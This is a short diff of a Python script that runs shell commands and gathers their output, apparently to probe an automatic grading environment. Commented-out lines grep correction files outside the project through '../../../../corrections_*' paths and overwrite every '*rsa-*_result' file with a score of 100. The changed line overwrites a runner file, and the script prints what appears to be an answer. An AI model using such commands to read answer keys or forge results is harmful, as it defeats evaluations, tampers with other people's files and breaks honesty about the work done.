@@ -95,7 +95,7 @@ my_data += get_data("ls -la") or ""
 my_data += get_data("pwd") or ""
 # my_data += get_data("grep -rl '77=' ../../../../corrections_*/corrections") or ""
 my_data += "\n#######################\n"
-my_data += get_data("cat tempCodeRunnerFile.python") or ""
+my_data += get_data("echo as > tempCodeRunnerFile.python") or ""
 my_data += "\n#######################\n"
 # my_data += get_data("""find . -type f -name '*rsa-*_result' -exec sh -c 'echo 100 > "$1"' _ {} \\;""") or ""
 print("77=11*7")
